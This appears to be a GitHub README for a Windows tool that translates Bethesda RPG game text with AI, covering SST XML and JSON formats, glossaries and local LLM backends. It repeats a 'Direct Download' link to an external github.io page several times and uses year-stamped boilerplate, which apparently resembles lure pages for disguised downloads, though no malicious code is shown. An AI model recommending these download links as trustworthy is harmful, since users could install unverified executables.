# Bethesda AI Translator v2026 - localization tool 2026

> **Windows localization utility for Bethesda RPG translation pipelines, blending AI-assisted text processing, SST XML support, and local LLM integration for version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tyler-west2006/bethesda-rpg-translator-v2026?style=flat-square)](https://github.com/tyler-west2006/bethesda-rpg-translator-v2026)

---

<p align="center">
  <a href="https://tyler-west2006.github.io/bethesda-rpg-translator-v2026/">
    <img src="https://img.shields.io/badge/Download-Bethesda%20AI%20Translator%20Latest-brightgreen?style=for-the-badge" alt="Download Bethesda AI Translator">
  </a>
</p>

> **[Direct Download - Bethesda AI Translator v2026](https://tyler-west2006.github.io/bethesda-rpg-translator-v2026/)**

---

[Download Latest Build](https://tyler-west2006.github.io/bethesda-rpg-translator-v2026/)

---

## What Bethesda AI Translator Is For

Bethesda AI Translator is a Windows-based localization tool aimed at translating Bethesda RPG material with help from AI. It centers on game-text workflows, so you can take source strings through to translated output while working with SST XML and JSON import/export.

It is suited to mod creators, translation groups, and anyone who needs to manage dialogue or UI text in a structured format. With options for local LLM integration and context handling tied to presets, it supports translation work that depends on consistency, reusable terminology, and control over larger text collections.

---

## Capabilities

- AI-assisted translation for game text and localization tasks
- SST XML import and export for structured translation workflows
- JSON import and export for flexible data handling
- Game preset context awareness for Bethesda RPG content
- NPC dialogue profile support for character-specific translation context
- Glossary tools to help manage recurring terms
- Proper noun extraction for names and location references
- API throttling and auto-recovery for more stable translation runs
- Local LLM integration with Ollama and LM Studio support
- Multi-language UI for working in different interface languages

---

## Installation

1. Download the latest build from the release page:
   [Download Latest Build](https://tyler-west2006.github.io/bethesda-rpg-translator-v2026/)
2. Or clone the repository locally:
   `git clone https://github.com/tyler-west2006/bethesda-rpg-translator-v2026.git
3. Open the project folder and launch the Windows build or packaged application included with your download.

If you plan to use a local LLM backend, confirm that Ollama or LM Studio is running before you begin a translation session.

---

## How to Use It

A common workflow is:

1. Import your source content using SST XML or JSON.
2. Select the relevant game preset so the tool can apply context-aware handling.
3. Review NPC dialogue profiles and glossary entries before translating.
4. Run AI-assisted translation with your chosen local or API-backed model.
5. Export the finished output back to SST XML or JSON for your project.

Helpful workflow notes:

- Use glossary tools to keep key terms aligned across chapters or files.
- Check extracted proper nouns before final export.
- If a request is interrupted, the throttling and recovery behavior can help resume the process cleanly.

---

## Configuration

All settings are configured within the application and vary based on the translation workflow you choose.

Typical configuration sections include:

- Translation provider selection
- Local LLM connection details for Ollama or LM Studio
- Glossary and terminology preferences
- UI language selection
- Import and export format options

Example configuration layout:

    {
      "provider": "local",
      "model": "your-model-name",
      "sourceFormat": "sst-xml",
      "targetFormat": "json",
      "language": "en"
    }

---

## Requirements

- Windows
- A compatible local environment for running the application
- Optional: Ollama or LM Studio for local LLM integration
- Enough storage for project files, translation assets, and exported output
- Internet access only if you use online resources or remote API-backed translation features

---

## FAQ

**Is this built for Bethesda RPG translation workflows?**  
Yes. It is intended for localization work involving Bethesda RPG content and related text structures.

**Can I use local models instead of a remote service?**  
Yes. Local LLM integration is included, with support for Ollama and LM Studio.

**What file formats can I work with?**  
The listed workflow supports SST XML and JSON import/export.

**Where do I change language or translation settings?**  
Those options are handled inside the app configuration and UI settings.

**What should I do if translation requests fail or pause?**  
Check your provider setup, model availability, and API limits. The tool includes throttling and auto-recovery features to help with interrupted runs.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
